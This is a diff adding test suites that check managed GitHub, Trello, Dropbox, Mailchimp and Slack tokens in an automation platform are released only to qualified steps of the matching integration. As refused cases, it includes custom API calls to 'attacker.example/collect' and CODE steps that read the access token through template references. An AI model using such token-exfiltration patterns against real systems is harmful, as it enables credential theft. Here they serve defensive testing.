@@ -10,6 +10,12 @@ import { afterEach, beforeEach, describe, expect, test } from "bun:test";
 import { CredentialResolver } from "../credentials/adapter";
 import { JarvisGoogleConnectionSource } from "../credentials/google-source";
 import { JarvisClickUpConnectionSource } from "../credentials/clickup-source";
+import { JarvisMailchimpConnectionSource } from "../credentials/mailchimp-source";
+import { JarvisGitHubConnectionSource } from "../credentials/github-source";
+import { JarvisTrelloConnectionSource } from "../credentials/trello-source";
+import { JarvisDropboxConnectionSource } from "../credentials/dropbox-source";
+import type { JarvisConfig } from "../../config/types";
+import { JarvisSlackConnectionSource } from "../credentials/slack-source";
 import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -30,6 +36,10 @@ const GMAIL = "@activepieces/piece-gmail";
 const HTTP = "@activepieces/piece-http";
 const SLACK = "@activepieces/piece-slack";
 const CLICKUP = "@activepieces/piece-clickup";
+const MAILCHIMP = "@activepieces/piece-mailchimp";
+const GITHUB = "@activepieces/piece-github";
+const TRELLO = "@activepieces/piece-trello";
+const DROPBOX = "@activepieces/piece-dropbox";
 
 const pieces = new PieceCatalog([
   { name: GMAIL, displayName: "Gmail", description: "", auth: { type: "OAUTH2" }, actions: {
@@ -57,8 +67,58 @@ const pieces = new PieceCatalog([
       { name: "method", label: "", type: "string", required: false },
     ] } },
   } },
+  { name: TRELLO, displayName: "Trello", description: "", auth: { type: "BASIC_AUTH" }, actions: {
+    create_card: { name: "create_card", displayName: "", description: "", inputSchema: { fields: [
+      { name: "name", label: "", type: "string", required: false },
+    ] } },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+  } },
+  { name: DROPBOX, displayName: "Dropbox", description: "", auth: { type: "OAUTH2" }, actions: {
+    list_dropbox_folder: { name: "list_dropbox_folder", displayName: "", description: "", inputSchema: { fields: [
+      { name: "path", label: "", type: "string", required: false },
+    ] } },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+  } },
+  { name: MAILCHIMP, displayName: "Mailchimp", description: "", auth: { type: "OAUTH2" }, actions: {
+    find_subscriber: { name: "find_subscriber", displayName: "", description: "", inputSchema: { fields: [
+      { name: "email", label: "", type: "string", required: false },
+    ] } },
+    // Not in the pinned 0.5.10 piece; here to pin what an empty host list means if a later version adds one.
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+  } },
   { name: SLACK, displayName: "Slack", description: "", auth: { type: "OAUTH2" }, actions: {
     send_message: { name: "send_message", displayName: "", description: "" },
+    slack_find_channel: { name: "slack_find_channel", displayName: "", description: "" },
+    slack_get_channel_info: { name: "slack_get_channel_info", displayName: "", description: "" },
+    slack_post_message: { name: "slack_post_message", displayName: "", description: "" },
+    send_channel_message: { name: "send_channel_message", displayName: "", description: "" },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+  }, triggers: {
+    new_message: { name: "new_message", displayName: "", description: "" },
+  } },
+  { name: GITHUB, displayName: "GitHub", description: "", auth: { type: "OAUTH2" }, actions: {
+    github_create_issue: { name: "github_create_issue", displayName: "", description: "", inputSchema: { fields: [
+      { name: "title", label: "", type: "string", required: false },
+    ] } },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
+    ] } },
+    create_branch: { name: "create_branch", displayName: "", description: "" },
+  }, triggers: {
+    new_issue: { name: "new_issue", displayName: "", description: "" },
   } },
 ] as any);
 
@@ -328,6 +388,332 @@ describe("managed ClickUp is scoped to ClickUp steps", () => {
       const response = await fetchFor(runOf(trigger), "jarvis:clickup");
       expect(response.status).toBe(200);
       expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: CLICKUP, value: { access_token: CLICKUP_TOKEN } });
+    }
+  });
+});
+
+describe("managed GitHub is scoped to GitHub steps", () => {
+  const GITHUB_TOKEN = "synthetic-managed-github-access-token";
+  const ref = "{{connections.jarvis:github}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "github-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "github.json"), JSON.stringify({ version: 1, provider: "github", status: "connected",
+      generation: crypto.randomUUID(), access_token: GITHUB_TOKEN, account: { id: "1", label: "octocat" },
+      workspaces: [], connected_at: new Date().toISOString() }));
+    credentials.register(new JarvisGitHubConnectionSource(dataDir));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const create = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
+    name: "create", type: "PIECE", settings: { pieceName: GITHUB, actionName: "github_create_issue", input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const githubTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
+    settings: { pieceName: GITHUB, triggerName: "new_issue", input: { auth: ref }, ...extra } });
+  const githubCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: GITHUB, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a GitHub step next to a CODE step that reads the token", empty(create(undefined, code({ token: "{{connections['jarvis:github'].access_token}}" })))],
+    ["a GitHub custom API call to another host", empty(githubCall("https://attacker.example/collect"))],
+    ["a GitHub custom API call to plain http on its own host", empty(githubCall("http://api.github.com/user"))],
+    ["a GitHub custom API call to github.com instead of its API host", empty(githubCall("https://github.com/login"))],
+    // Defense in depth: only the five managed issue actions get the token, even on GitHub's own API host.
+    ["a GitHub custom API call to a path under its API", empty(githubCall("/user"))],
+    ["a GitHub custom API call on api.github.com", empty(githubCall("https://api.github.com/user"))],
+    ["a GitHub action outside the managed issue actions", empty({ name: "branch", type: "PIECE", settings: { pieceName: GITHUB, actionName: "create_branch", input: { auth: ref } } })],
+    ["a GitHub trigger", githubTrigger()],
+    ["a GitHub trigger that also carries a managed actionName", githubTrigger({ actionName: "github_create_issue" })],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:github");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(GITHUB_TOKEN);
+    });
+  }
+  test("the refusal names GitHub", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:github can only be used by GitHub steps");
+    expect(issue!.allowedPieces).toEqual([GITHUB]);
+    const [call] = bindingIssues(empty(githubCall("https://api.github.com/user")));
+    expect(call!.message).toBe("This GitHub connection does not support this action or trigger yet");
+  });
+  test("a trigger hook of a GitHub trigger is refused the token", async () => {
+    for (const trigger of [githubTrigger(), githubTrigger({ actionName: "github_create_issue" })]) {
+      const flow = createFlow({});
+      const version = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger });
+      const response = await fetchFor(triggerHookRunId("poll", flow.id, version), "jarvis:github");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(GITHUB_TOKEN);
+    }
+  });
+  test("every managed GitHub issue action's auth passes the connection scope and resolves", async () => {
+    for (const actionName of ["github_create_issue", "getIssueInformation", "update_issue", "find_issue", "createCommentOnAIssue"]) {
+      const trigger = empty({ name: "step", type: "PIECE", settings: { pieceName: GITHUB, actionName, input: { auth: ref } } });
+      if (actionName === "github_create_issue") expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:github");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: GITHUB, value: { access_token: GITHUB_TOKEN, jarvis_managed: "github" } });
+    }
+  });
+});
+
+describe("managed Trello is scoped to Trello steps", () => {
+  const TRELLO_TOKEN = "synthetic-managed-trello-user-token";
+  const ref = "{{connections.jarvis:trello}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "trello-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "trello.json"), JSON.stringify({ version: 1, provider: "trello", status: "connected",
+      generation: crypto.randomUUID(), access_token: TRELLO_TOKEN, settings: { api_key: "synthetic-public-key" },
+      account: { id: "a".repeat(24), label: "owner" }, workspaces: [], connected_at: new Date().toISOString() }));
+    credentials.register(new JarvisTrelloConnectionSource(dataDir));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const card = (input: Record<string, unknown> = { auth: ref }, nextAction?: any, actionName = "create_card"): any => ({
+    name: "card", type: "PIECE", settings: { pieceName: TRELLO, actionName, input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const trelloTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
+    settings: { pieceName: TRELLO, triggerName: "new_card", input: { auth: ref }, ...extra } });
+  const trelloCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: TRELLO, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a Trello step next to a CODE step that reads the token", empty(card(undefined, code({ token: "{{connections['jarvis:trello'].password}}" })))],
+    ["a Trello custom API call to another host", empty(trelloCall("https://attacker.example/collect"))],
+    // The managed connection runs only its qualified actions; the engine would refuse these too.
+    ["a Trello custom API call on api.trello.com", empty(trelloCall("https://api.trello.com/1/members/me"))],
+    ["a Trello action outside the managed set", empty(card({ auth: ref }, undefined, "delete_card"))],
+    ["a Trello trigger", trelloTrigger()],
+    ["a Trello trigger carrying a stray qualified actionName", trelloTrigger({ actionName: "create_card" })],
+    ["a Trello step carrying a stray triggerName", empty({ ...card(), settings: { ...card().settings, triggerName: "new_card" } })],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:trello");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(TRELLO_TOKEN);
+    });
+  }
+  test("the refusal names Trello", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:trello can only be used by Trello steps");
+    expect(issue!.allowedPieces).toEqual([TRELLO]);
+  });
+  test("a refused Trello trigger or action says the connection does not support it", () => {
+    for (const trigger of [trelloTrigger(), trelloTrigger({ actionName: "create_card" }), empty(card({ auth: ref }, undefined, "delete_card"))]) {
+      expect(bindingIssues(trigger).map(i => i.message)).toContain("This Trello connection does not support this action or trigger yet");
+    }
+  });
+  test("a Trello step auth on a qualified action passes the connection scope and resolves", async () => {
+    for (const actionName of ["list_boards", "list_lists", "get_card", "create_card", "move_card"]) {
+      const trigger = empty(card({ auth: ref }, undefined, actionName));
+      expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:trello");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "BASIC_AUTH", pieceName: TRELLO, value: { password: TRELLO_TOKEN } });
+    }
+  });
+});
+
+describe("managed Dropbox is scoped to Dropbox steps", () => {
+  const DROPBOX_TOKEN = "synthetic-managed-dropbox-access-token";
+  const ref = "{{connections.jarvis:dropbox}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "dropbox-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "dropbox.json"), JSON.stringify({ version: 1, provider: "dropbox", status: "connected",
+      generation: crypto.randomUUID(), access_token: DROPBOX_TOKEN, refresh_token: "synthetic-dropbox-refresh",
+      expires_at: new Date(Date.now() + 3600000).toISOString(), account: { id: "dbid:1", label: "owner" },
+      workspaces: [{ id: "123", name: "Dropbox home" }], settings: { home_namespace_id: "123" }, connected_at: new Date().toISOString(),
+      refresh: { url: "https://app.usejarvis.dev/api/integrations/dropbox/refresh", instance_id: crypto.randomUUID(), secret: "a".repeat(64) } }));
+    const config = { daemon: { data_dir: dataDir }, usejarvis_integrations: { page_url: "https://app.usejarvis.dev/account" } } as JarvisConfig;
+    // No network: the stored token is fresh, so resolve never refreshes.
+    credentials.register(new JarvisDropboxConnectionSource(config, (async () => { throw new Error("no network in tests"); }) as unknown as typeof fetch));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const step = (input: Record<string, unknown> = { auth: ref }, nextAction?: any, actionName = "list_dropbox_folder"): any => ({
+    name: "files", type: "PIECE", settings: { pieceName: DROPBOX, actionName, input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const dropboxCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: DROPBOX, actionName: "custom_api_call", input: { auth: ref, method: "POST", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a Dropbox step next to a CODE step that reads the token", empty(step(undefined, code({ token: "{{connections['jarvis:dropbox'].access_token}}" })))],
+    ["a Dropbox custom API call to another host", empty(dropboxCall("https://attacker.example/collect"))],
+    // The managed connection runs only its qualified actions; the engine would refuse these too.
+    ["a Dropbox custom API call on api.dropboxapi.com", empty(dropboxCall("https://api.dropboxapi.com/2/files/delete_v2"))],
+    ["a Dropbox action outside the managed set", empty(step({ auth: ref }, undefined, "delete_dropbox_file"))],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:dropbox");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(DROPBOX_TOKEN);
+    });
+  }
+  test("the refusal names Dropbox", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:dropbox can only be used by Dropbox steps");
+    expect(issue!.allowedPieces).toEqual([DROPBOX]);
+  });
+  test("a Dropbox step auth on a qualified action passes the connection scope and resolves", async () => {
+    for (const actionName of ["search_dropbox", "list_dropbox_folder", "get_dropbox_file_metadata", "create_new_dropbox_folder"]) {
+      const trigger = empty(step({ auth: ref }, undefined, actionName));
+      expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:dropbox");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: DROPBOX, value: { access_token: DROPBOX_TOKEN, jarvis_managed: "dropbox" } });
+    }
+  });
+});
+
+describe("managed Mailchimp is scoped to Mailchimp steps", () => {
+  const MAILCHIMP_TOKEN = "synthetic-managed-mailchimp-access-token";
+  const ref = "{{connections.jarvis:mailchimp}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "mailchimp-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "mailchimp.json"), JSON.stringify({ version: 1, provider: "mailchimp", status: "connected",
+      generation: crypto.randomUUID(), access_token: MAILCHIMP_TOKEN, settings: { server_prefix: "us1" },
+      account: { id: "account1", label: "owner" }, workspaces: [], connected_at: new Date().toISOString() }));
+    credentials.register(new JarvisMailchimpConnectionSource(dataDir));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const find = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
+    name: "find", type: "PIECE", settings: { pieceName: MAILCHIMP, actionName: "find_subscriber", input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const mailchimpTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
+    settings: { pieceName: MAILCHIMP, triggerName: "subscribe", input: { auth: ref }, ...extra } });
+  const mailchimpCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: MAILCHIMP, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a Mailchimp step next to a CODE step that reads the token", empty(find(undefined, code({ token: "{{connections['jarvis:mailchimp'].access_token}}" })))],
+    // No fixed host: even the account's own data center is only reachable as a path.
+    ["a Mailchimp custom API call to a full URL", empty(mailchimpCall("https://us1.api.mailchimp.com/3.0/ping"))],
+    // Only the five managed actions get the token, so not even a path is reachable.
+    ["a Mailchimp custom API call by path", empty(mailchimpCall("/ping"))],
+    ["a Mailchimp action outside the managed actions", empty({ name: "send", type: "PIECE", settings: { pieceName: MAILCHIMP, actionName: "send_campaign", input: { auth: ref } } })],
+    ["a Mailchimp step that also carries a triggerName", empty({ name: "find", type: "PIECE", settings: { pieceName: MAILCHIMP, actionName: "find_subscriber", triggerName: "subscribe", input: { auth: ref } } })],
+    ["a Mailchimp trigger", mailchimpTrigger()],
+    ["a Mailchimp trigger that also carries a managed actionName", mailchimpTrigger({ actionName: "find_subscriber" })],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:mailchimp");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(MAILCHIMP_TOKEN);
+    });
+  }
+  test("the refusal names Mailchimp", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:mailchimp can only be used by Mailchimp steps");
+    expect(issue!.allowedPieces).toEqual([MAILCHIMP]);
+    const [call] = bindingIssues(empty(mailchimpCall("/ping")));
+    expect(call!.message).toBe("This Mailchimp connection does not support this action or trigger yet");
+  });
+  test("a trigger hook of a Mailchimp trigger is refused the token", async () => {
+    for (const trigger of [mailchimpTrigger(), mailchimpTrigger({ actionName: "find_subscriber" })]) {
+      const flow = createFlow({});
+      const version = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger });
+      const response = await fetchFor(triggerHookRunId("poll", flow.id, version), "jarvis:mailchimp");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(MAILCHIMP_TOKEN);
+    }
+  });
+  test("every managed Mailchimp action's auth passes the connection scope and resolves", async () => {
+    for (const actionName of ["find_subscriber", "add_subscriber_to_tag", "remove_subscriber_from_tag", "find_campaign", "get_campaign_report"]) {
+      const trigger = empty({ name: "step", type: "PIECE", settings: { pieceName: MAILCHIMP, actionName, input: { auth: ref } } });
+      expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:mailchimp");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: MAILCHIMP, value: { access_token: MAILCHIMP_TOKEN, server_prefix: "us1", jarvis_managed: "mailchimp" } });
+    }
+  });
+});
+
+describe("managed Slack is scoped to Slack steps", () => {
+  const SLACK_TOKEN = "synthetic-managed-slack-bot-token";
+  const ref = "{{connections.jarvis:slack}}";
+  let dataDir: string;
+  beforeEach(() => {
+    dataDir = mkdtempSync(join(tmpdir(), "slack-scope-"));
+    mkdirSync(join(dataDir, "connections"));
+    writeFileSync(join(dataDir, "connections", "slack.json"), JSON.stringify({ version: 1, provider: "slack", status: "connected",
+      generation: crypto.randomUUID(), access_token: SLACK_TOKEN, account: { id: "U123", label: "Jarvis bot" },
+      workspaces: [{ id: "T123", name: "Sandbox" }], settings: { scopes: "channels:read,chat:write,groups:read" },
+      connected_at: new Date().toISOString() }));
+    credentials.register(new JarvisSlackConnectionSource(dataDir));
+  });
+  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
+  const post = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
+    name: "post", type: "PIECE", settings: { pieceName: SLACK, actionName: "slack_post_message", input }, ...(nextAction ? { nextAction } : {}),
+  });
+  const slackTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
+    settings: { pieceName: SLACK, triggerName: "new_message", input: { auth: ref }, ...extra } });
+  const slackCall = (url: string): any => ({ name: "call", type: "PIECE",
+    settings: { pieceName: SLACK, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
+  const refused: Array<[string, any]> = [
+    ["a CODE step input", empty(code({ conn: ref }))],
+    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
+    ["a Gmail step auth", empty(gmail({ auth: ref }))],
+    ["a Slack step next to a CODE step that reads the token", empty(post(undefined, code({ token: "{{connections['jarvis:slack'].access_token}}" })))],
+    ["a Slack custom API call to another host", empty(slackCall("https://attacker.example/collect"))],
+    // Defense in depth: only the four managed Slack actions get the token, even on Slack's own API host.
+    ["a Slack custom API call to a path under its API", empty(slackCall("/auth.test"))],
+    ["a Slack custom API call on slack.com", empty(slackCall("https://slack.com/api/auth.test"))],
+    ["a Slack action outside the managed actions", empty({ name: "send", type: "PIECE", settings: { pieceName: SLACK, actionName: "send_message", input: { auth: ref } } })],
+    ["a Slack trigger", slackTrigger()],
+    ["a Slack trigger that also carries a managed actionName", slackTrigger({ actionName: "slack_post_message" })],
+  ];
+  for (const [label, trigger] of refused) {
+    test(`${label} is not ready and the route refuses it`, async () => {
+      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
+      const response = await fetchFor(runOf(trigger), "jarvis:slack");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(SLACK_TOKEN);
+    });
+  }
+  test("the refusal names Slack", () => {
+    const [issue] = bindingIssues(empty(code({ conn: ref })));
+    expect(issue!.message).toBe("Managed connection jarvis:slack can only be used by Slack steps");
+    expect(issue!.allowedPieces).toEqual([SLACK]);
+    const [call] = bindingIssues(empty(slackCall("https://slack.com/api/auth.test")));
+    expect(call!.message).toBe("This Slack connection does not support this action or trigger yet");
+  });
+  test("a trigger hook of a Slack trigger is refused the token", async () => {
+    for (const trigger of [slackTrigger(), slackTrigger({ actionName: "slack_post_message" })]) {
+      const flow = createFlow({});
+      const version = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger });
+      const response = await fetchFor(triggerHookRunId("poll", flow.id, version), "jarvis:slack");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(SLACK_TOKEN);
+    }
+  });
+  test("every managed Slack action's auth passes the connection scope and resolves", async () => {
+    for (const actionName of ["slack_find_channel", "slack_get_channel_info", "slack_post_message", "send_channel_message"]) {
+      const trigger = empty({ name: "step", type: "PIECE", settings: { pieceName: SLACK, actionName, input: { auth: ref } } });
+      expect(bindingIssues(trigger)).toEqual([]);
+      const response = await fetchFor(runOf(trigger), "jarvis:slack");
+      expect(response.status).toBe(200);
+      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: SLACK, value: { access_token: SLACK_TOKEN } });
     }
   });
 });
